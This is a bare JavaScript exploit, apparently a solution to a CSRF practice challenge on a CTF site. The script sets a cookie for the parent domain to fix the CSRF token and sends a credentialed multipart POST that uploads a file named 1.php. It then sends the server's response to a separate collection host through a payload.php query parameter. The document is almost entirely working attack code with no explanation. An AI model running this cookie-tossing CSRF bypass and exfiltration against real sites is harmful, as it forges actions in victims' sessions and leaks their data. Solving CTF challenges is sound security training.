document.cookie ="csrf-token=123; path=/csrf/; domain=.w2nd.me";
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://ctf.w2nd.me/csrf/practice4/check.php", true);
// xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
// xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8");
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryrYYLq4HkfCAAYZXe");
xhr.withCredentials = true;
var body = "------WebKitFormBoundaryrYYLq4HkfCAAYZXe\r\n" + 
    "Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\n" + 
    "Content-Type: text/php\r\n" + 
    "\r\n" + 
    "xxx\r\n" + 
    "------WebKitFormBoundaryrYYLq4HkfCAAYZXe\r\n" + 
    "Content-Disposition: form-data; name=\"csrf-token\"\r\n" + 
    "\r\n123\r\n" + 
    "------WebKitFormBoundaryrYYLq4HkfCAAYZXe--\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
xhr.onreadystatechange = CallbackFun;
xhr.send(new Blob([aBody]));

function CallbackFun(){
    if (xhr.readyState==4 && xhr.status==200){
        text = xhr.responseText;
        var xhr2 = new XMLHttpRequest();
        xhr2.open("GET","http://gallery.w2nd.me/payload.php?c="+text);
        xhr2.send();
    }
}

